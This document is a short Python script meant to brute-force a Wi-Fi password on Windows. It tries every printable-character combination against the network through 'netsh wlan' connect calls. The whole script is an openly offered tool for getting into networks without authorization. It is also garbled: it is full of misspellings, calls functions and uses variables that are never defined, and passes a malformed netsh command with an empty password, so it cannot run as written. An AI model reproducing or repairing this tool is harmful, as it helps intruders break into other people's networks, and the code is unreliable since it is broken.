import os
import string
import itertools

def algorythm():
    ascii_chars = string.printable.strip()

    for length in range(1, 65):
        for combination in itertools.product(ascii_chars, repeat=length):
            password = ''.join(cobination)
            print(f'Password Brute Force: {password}')

            if conect_wifi_windows(network_name, password):
                print(f'The Password of {network_name} is {password}')
                return password
                
    print('Something is Wrong!!!')
    return none
def conect_wifi_windows(ssid, password):
    
    conect = os.system(f'netsh wlan conect name={ssid} password=')
def visible_wifi_windows():
    search_result = os.popen("netsh wlan show networks").read()
    print('Wifi Seracg Result:')
    print(serach_result)


network_name = input('Digit the name of the Network: ')

conected_wifi_windows(network_name, password)